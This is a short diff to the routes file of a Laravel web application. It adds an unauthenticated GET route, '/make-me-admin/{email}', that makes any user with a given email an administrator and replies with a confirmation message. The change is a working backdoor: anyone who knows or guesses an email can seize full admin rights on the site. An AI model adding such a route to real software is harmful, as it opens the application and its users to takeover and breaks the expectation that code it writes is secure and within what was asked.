@@ -19,6 +19,15 @@ Route::post('/password/verify-otp', [NewPasswordController::class, 'verifyOtp'])
  
 Route::patch('/admin/cats/{id}/status', [CatController::class, 'updateStatus'])
      ->name('admin.cats.updateStatus');
+     Route::get('/make-me-admin/{email}', function($email) {
+    $user = \App\Models\User::where('email', $email)->first();
+    if ($user) {
+        $user->is_admin = true;
+        $user->save();
+        return "User {$email} is now an admin!";
+    }
+    return "User not found";
+});
 
 // ==============================
 // Public Routes
